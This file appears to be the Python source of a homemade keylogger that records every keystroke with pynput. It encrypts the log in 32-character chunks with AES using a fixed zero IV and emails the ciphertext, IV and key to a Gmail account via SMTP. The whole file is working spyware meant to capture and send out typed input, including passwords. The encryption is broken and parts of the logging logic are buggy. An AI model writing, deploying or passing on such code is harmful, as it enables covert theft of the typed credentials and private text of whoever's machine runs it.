#! /usr/bin/python3

#Imports
import getpass
import smtplib
import base64
import hashlib
from Crypto.Cipher import AES
from pynput.keyboard import Key, Controller, Listener
from Crypto import Random





# Logo
print ("""================================================================""")
print (r"""
 _   __ _____ __   __ _      _____  _____  _____  _____ ______ 
| | / /|  ___|\ \ / /| |    |  _  ||  __ \|  __ \|  ___|| ___ \
| |/ / | |__   \ V / | |    | | | || |  \/| |  \/| |__  | |_/ /
|    \ |  __|   \ /  | |    | | | || | __ | | __ |  __| |    / 
| |\  \| |___   | |  | |____\ \_/ /| |_\ \| |_\ \| |___ | |\ \ 
\_| \_/\____/   \_/  \_____/ \___/  \____/ \____/\____/ \_| \_|
                                                             """)
print ("""================================================================""")
print("""By: CTC """)

#Asks user for input, then sets up a mail account to send the input to
#Resource from: https://realpython.com/python-send-email/
email = input('Enter Your Email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)
password = input('Enter your desired AES Password: ')
print('Everything is setup, the keylogger may start')

key = ''
key_bytes = ''
plaintext = ''
raw = ''
data_to_be_sent = ''
full_log = ''
word = ''


#Building the keylogger (seems to work just fine)

def on_press(key):
    global full_log
    k = str(key).replace("'", "")
     
    if k == 'Key.enter':
        full_log += "[ENTER]\n"
    elif k == 'Key.space':
        full_log = full_log.replace("Key.space", " ")
    elif k == 'Key.backspace':
        full_log = full_log[:-1] 
        full_log = full_log.replace("Key.backspace", " ")
    elif k == 'Key.shift':
        full_log += '^'
    elif k == 'Key.delete':
        full_log += '[DEL]'
    if len(full_log) == 32:
      data_to_be_encrypted = full_log
      full_log = ''
      encrypt(data_to_be_encrypted, password)
      data_to_be_encrypted = ''
    else:
      full_log += k 
      print(full_log)
           



#My most precious fucking encryption function i swear i will fucking kill this piece of shit code


def encrypt(data_to_be_encrypted, password):

    
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    mode = AES.MODE_CBC
    iv = 16 * b'\x00'
    cipher = AES.new(private_key, mode, iv)
    ciphertext = cipher.encrypt(data_to_be_encrypted.encode("utf-8"))
    server.sendmail(
          email,
          email,
          ciphertext
     )
    server.sendmail(
          email,
          email,
          iv
     )
    server.sendmail(
          email,
          email,
          private_key
    )
#This stuff starts the listener shit
with Listener( on_press=on_press ) as listener:
      listener.join()
